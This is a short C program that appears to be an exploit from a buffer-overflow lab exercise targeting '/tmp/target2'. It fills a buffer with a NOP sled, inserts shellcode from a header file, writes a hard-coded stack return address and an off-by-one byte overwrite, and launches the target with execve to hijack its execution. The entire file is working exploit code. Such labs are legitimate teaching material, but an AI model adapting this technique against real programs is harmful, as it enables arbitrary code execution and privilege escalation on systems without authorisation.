#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include "shellcode.h"

#define TARGET "/tmp/target2"

int main(void)
{
  char *args[3];
  char *env[1];
  char buf[161];
  memset(buf, 0x90, 161);

  strncpy(buf+111, shellcode, 45);
  strncpy(buf+160, "\x70", 1);
  strncpy(buf+156, "\x08\xfd\xff\xbf", 4);

  args[0] = TARGET;
  args[1] = buf;
  args[2] = NULL;
  env[0] = NULL;

  if (0 > execve(TARGET, args, env))
    fprintf(stderr, "execve failed.\n");

  return 0;
}
